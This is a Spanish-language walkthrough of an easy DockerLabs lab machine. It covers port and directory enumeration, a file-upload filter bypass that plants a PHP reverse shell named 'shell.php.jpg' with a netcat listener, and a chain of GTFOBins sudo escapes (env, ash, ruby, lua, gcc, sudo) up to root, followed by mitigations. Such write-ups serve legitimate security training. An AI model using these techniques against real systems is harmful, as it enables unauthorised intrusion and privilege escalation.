## Resumen

Es una máquina de dificultad fácil de DockerLabs en la que se tiene que enumerar directorios y meter un archivo para ejecutar una revshell y luego tener que escalar privilegios con `sudo -l` entre varios usuarios hasta escalar hasta root.

## Enumeración

Empiezo haciendo un ping a la máquina para así saber qué SO usa.

`ping -c 1 172.17.0.2`

```
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.094 ms
```

Con esto puedo saber que es una máquina Linux.

Sigo con nmap para escanear los puertos abiertos.

`nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG nmap`

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-26 09:58 -0400
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: BE:C9:A2:38:02:05 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.88 seconds
```

Vemos que hay abierto un servidor Apache, así que sigo con él.

Puertos encontrados:

- `80/Apache`

## Análisis puerto 80

Entro a la web y veo que no tiene nada interesante, así que sigo enumerando con gobuster.

![alt text](<Imagenes/ascensor.png>)

`gobuster dir -u http://172.17.0.2/themes -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt`

```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/themes
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.txt (Status: 403) [Size: 275]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.php (Status: 403) [Size: 275]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.html (Status: 403) [Size: 275]
uploads              (Status: 301) [Size: 317] [--> http://172.17.0.2/themes/uploads/]
upload.php           (Status: 200) [Size: 0]
Template             (Status: 403) [Size: 275]
archivo.html         (Status: 200) [Size: 3380]
Repository           (Status: 403) [Size: 275]
Tag                  (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Veo que hay un archivo llamado `archivo.html`, así que accedo a él para ver qué tiene.

## Explotación

Una vez dentro veo que nos deja subir archivos `.jpg` al servidor, una buena opción para subir una revshell.

![alt text](<Imagenes/archivo.png>)


Antes de subir el archivo pongo el listener. `nc -lvnp 4444` Ya que solo deja `.jpg`, la renombro como `shell.php.jpg` para saltar el filtro, que probablemente solo comprueba la extensión del final, así que usando ese método podemos saltarnos el filtro. 

Subo el archivo.

![alt text](<Imagenes/upload.png>)

## Escalada de privilegios

Una vez dentro compruebo quién soy y veo que soy el usuario `www-data`.

```
$ whoami
www-data
```

Empiezo con `sudo -l`.

```
sudo -l

User www-data may run the following commands on 4e460699da66:
    (daphne) NOPASSWD: /usr/bin/env
```

Pone que nuestro usuario puede ejecutar /usr/bin/env como el usuario daphne.

```
$ sudo -u daphne /usr/bin/env /bin/sh
whoami
daphne
```

Una vez como daphne, vuelvo a ejecutar `sudo -l` para ver si de nuevo hay algo.

```
sudo -l
User daphne may run the following commands on 4e460699da66:
    (vilma) NOPASSWD: /usr/bin/ash
```

De nuevo se puede volver a escalar privilegios.

`sudo -u vilma ash`

```
id
uid=1001(vilma) gid=1001(vilma) groups=1001(vilma)
```

Vuelvo a repetir el mismo proceso con vilma y veo que puedo escalar a shaggy.

```
User vilma may run the following commands on 4e460699da66:
    (shaggy) NOPASSWD: /usr/bin/ruby
```

`sudo -u shaggy ruby -e 'exec "/bin/sh"'`

```
id
uid=1002(shaggy) gid=1002(shaggy) groups=1002(shaggy)
```

Vuelvo a repetir lo mismo con shaggy.

`sudo -l`

```
User shaggy may run the following commands on 2e896771176e:
    (fred) NOPASSWD: /usr/bin/lua
```

`sudo -u fred lua -e 'os.execute("/bin/sh")'`

```
id
uid=1003(fred) gid=1003(fred) groups=1003(fred)
```

Una vez como fred, seguimos el mismo procedimiento para escalar al usuario scooby.

```
User fred may run the following commands on 2e896771176e:
    (scooby) NOPASSWD: /usr/bin/gcc
```

`sudo -u scooby gcc -wrapper /bin/sh,-s x`

```
id
uid=1004(scooby) gid=1004(scooby) groups=1004(scooby)
```

Una vez como scooby, ya podemos escalar a root vía sudo.

```
User scooby may run the following commands on 2e896771176e:
    (root) NOPASSWD: /usr/bin/sudo
```

`sudo sudo /bin/sh`

```
id
uid=0(root) gid=0(root) groups=0(root)
```

Una vez ya con la escalada de privilegios completada, acabamos la máquina.


**Referencias** 
Los comandos usados para la escalada de privilegios salen de https://gtfobins.org/.


## Flujo de ataque

1. **Enumeración** Se encuentra un Apache y, al enumerar directorios, se encuentra uno para poder subir archivos al servidor.
2. **Explotación** Se explota el endpoint `archivo.html` subiendo una revshell con la extensión .php.jpg.
3. **Escalada de privilegios** Usando el comando `sudo -l` vamos escalando los privilegios de distintos usuarios siguiendo este orden: www-data → daphne → vilma → shaggy → fred → scooby → root.



## Mitigaciones

1. Revisar los endpoints que permiten subir archivos: si es necesario mantenerlos, restringir estrictamente la extensión y el tamaño permitido, validar el contenido real (no solo la extensión), y generar nombres de archivo aleatorios o difíciles de adivinar para que solo puedan acceder los usuarios autorizados.


2. Usar el zero trust para poder evitar la escalada de privilegios lo máximo posible en este caso configurando los permisos de  usuarios para que tengan solo los permisos necesarios.